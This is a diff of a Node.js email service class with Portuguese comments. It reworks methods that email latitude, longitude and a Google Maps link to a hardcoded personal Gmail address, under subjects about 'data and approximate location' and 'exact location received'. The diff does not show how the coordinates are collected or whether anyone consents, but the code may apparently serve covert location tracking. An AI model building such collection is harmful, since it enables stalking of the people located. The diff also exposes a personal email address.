@@ -29,7 +29,7 @@ class ServiceEmail {
             await transporter.sendMail({
                 from: process.env.MAIL_USER, // Endereço do remetente
                 to: destinatarios, // Lista de destinatários
-                subject: "Localização", // Assunto do email
+                subject: "Dados e localização aproximada.", // Assunto do email
                 html: htmlResposta, // Corpo do email em HTML
             });
         
@@ -40,17 +40,13 @@ class ServiceEmail {
         }
         
     }
-    static enviarLocalizacaoPrecisa = async (lat, lon) => {
+    static enviarLocalizacaoExata = async (lat, lon) => {
         const email = 'uilhamgoncalves@gmail.com'
-
         const htmlResposta = `
-            <h3>Nova localização recebida:</h3>
-            <p><strong>Latitude:</strong> ${lat}</p>
-            <p><strong>Longitude:</strong> ${lon}</p>
+            <h3>Nova localização exata recebida:</h3>
+            <p>lat: ${lat} lon: ${lon}</p>
             <p><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Ver no Google Maps</a></p>
         `;
-    
-        
         const transporter = nodemailer.createTransport({
             service: "gmail",
             auth: {
@@ -58,18 +54,15 @@ class ServiceEmail {
                 pass: process.env.MAIL_PASS,
             }
         });
-    
         try {
             const destinatarios = [email].filter(Boolean); // Remove valores nulos ou indefinidos
-        
             await transporter.sendMail({
                 from: process.env.MAIL_USER, // Endereço do remetente
                 to: destinatarios, // Lista de destinatários
-                subject: "Localização", // Assunto do email
+                subject: "Localização exata recebida.", // Assunto do email
                 html: htmlResposta, // Corpo do email em HTML
             });
             console.log("E-mail enviado com sucesso para %s", destinatarios.join(', '));
-        
         } catch (erro) {
             console.error("Erro ao enviar o email: ", erro.toString());
         }
